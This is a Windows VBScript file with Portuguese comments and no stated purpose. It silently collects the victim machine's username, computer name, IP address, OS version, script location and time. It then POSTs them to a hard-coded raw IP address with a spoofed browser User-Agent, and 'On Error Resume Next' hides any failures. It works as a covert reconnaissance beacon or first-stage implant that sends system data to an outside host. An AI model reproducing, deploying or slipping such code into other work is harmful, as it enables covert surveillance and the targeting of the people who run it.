On Error Resume Next

' Configurações
Dim serverURL: serverURL = "http://100.26.23.21:3308/collect"
Dim userAgent: userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

' Coleta de informações do sistema
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' 1. Diretório de execução
Dim executionPath: executionPath = WScript.ScriptFullName
Dim executionDir: executionDir = fso.GetParentFolderName(executionPath)

' 2. Usuário atual
Dim userName: userName = ws.ExpandEnvironmentStrings("%USERNAME%")

' 3. Nome do computador
Dim computerName: computerName = ws.ExpandEnvironmentStrings("%COMPUTERNAME%")

' 4. IP da máquina (múltiplos métodos)
Dim ipAddress: ipAddress = GetIPAddress()

' 5. Sistema operacional
Dim osVersion: osVersion = GetOSVersion()

' 6. Timestamp
Dim currentTime: currentTime = Now()

' Constrói os dados para envio
Dim postData
postData = "execution_dir=" & URLEncode(executionDir) & _
           "&username=" & URLEncode(userName) & _
           "&computer_name=" & URLEncode(computerName) & _
           "&ip_address=" & URLEncode(ipAddress) & _
           "&os_version=" & URLEncode(osVersion) & _
           "&timestamp=" & URLEncode(currentTime)

' Envia via POST
SendPostRequest serverURL, postData, userAgent

' Função para obter endereço IP
Function GetIPAddress()
    Dim ip, objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    
    For Each objAdapter in colAdapters
        If IsArray(objAdapter.IPAddress) Then
            If UBound(objAdapter.IPAddress) >= 0 Then
                ip = objAdapter.IPAddress(0)
                Exit For
            End If
        End If
    Next
    
    If ip = "" Then ip = "Não detectado"
    GetIPAddress = ip
End Function

' Função para obter versão do OS
Function GetOSVersion()
    Dim os, objWMIService, colOS
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colOS = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    
    For Each os in colOS
        GetOSVersion = os.Caption & " (" & os.Version & ")"
        Exit Function
    Next
    
    GetOSVersion = "Windows Desconhecido"
End Function

' Função para codificar URL
Function URLEncode(str)
    Dim i, char, result
    For i = 1 To Len(str)
        char = Mid(str, i, 1)
        If InStr("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~", char) > 0 Then
            result = result & char
        Else
            result = result & "%" & Hex(Asc(char))
        End If
    Next
    URLEncode = result
End Function

' Função para enviar POST request
Sub SendPostRequest(url, data, ua)
    Dim http
    Set http = CreateObject("MSXML2.XMLHTTP.6.0")
    
    http.Open "POST", url, False
    http.setRequestHeader "User-Agent", ua
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.setRequestHeader "Content-Length", Len(data)
    http.Send data
    
    Set http = Nothing
End Sub

' Limpeza
Set ws = Nothing
Set fso = Nothing